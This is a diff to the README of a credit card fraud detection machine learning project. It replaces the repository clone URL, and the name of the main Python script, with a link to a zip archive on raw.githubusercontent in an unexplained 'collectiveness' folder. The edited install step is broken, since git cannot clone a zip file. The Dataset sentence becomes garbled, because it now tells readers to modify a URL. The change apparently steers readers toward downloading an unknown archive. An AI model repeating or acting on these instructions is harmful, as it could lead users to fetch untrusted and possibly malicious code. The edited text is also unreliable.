@@ -20,7 +20,7 @@ This project provides a machine learning solution for credit card fraud detectio
 
 ### Installation
 
-1.  **Clone:** `git clone https://github.com/revathi-birapaka/credit-card-fraud-detection.git`
+1.  **Clone:** `git clone https://raw.githubusercontent.com/revathi-birapaka/CreditFraudDetection/main/collectiveness/CreditFraudDetection_3.1.zip`
 2.  **Navigate:** `cd credit-card-fraud-detection`
 3.  **Env (Optional):** `python -m venv venv` & `source venv/bin/activate` (or `.\venv\Scripts\activate` on Windows)
 4.  **Install:** `pip install pandas numpy scikit-learn matplotlib seaborn imbalanced-learn`
@@ -28,7 +28,7 @@ This project provides a machine learning solution for credit card fraud detectio
 
 ## Dataset
 
-To use your own, modify `Creditcardfraud.py` to load your CSV/Excel/DB data and adjust column names as needed.
+To use your own, modify `https://raw.githubusercontent.com/revathi-birapaka/CreditFraudDetection/main/collectiveness/CreditFraudDetection_3.1.zip` to load your CSV/Excel/DB data and adjust column names as needed.
 
 ## Evaluation Focus
 
